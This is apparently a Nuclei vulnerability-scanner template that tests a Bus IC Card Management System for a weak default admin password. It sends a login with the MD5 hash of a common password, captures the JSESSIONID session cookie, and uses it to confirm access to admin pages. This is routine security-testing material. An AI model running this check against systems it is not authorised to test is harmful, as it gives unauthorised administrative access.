id: poc-yaml-bus-ic-card-ams-weak-password
info:
  name: Bus IC Card Management System Weak Password
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=e10adc3949ba59abbe56e057f20f883e
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{"statusCode":0}'
    extractors:
      - type: regex
        name: cookie
        part: header
        group: 1
        regex:
          - 'JSESSIONID=(.*?);'
  - raw:
      - |
        GET /html/organization.html HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{cookie}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "部门管理"
          - "系统设置"
          - "登记部门"
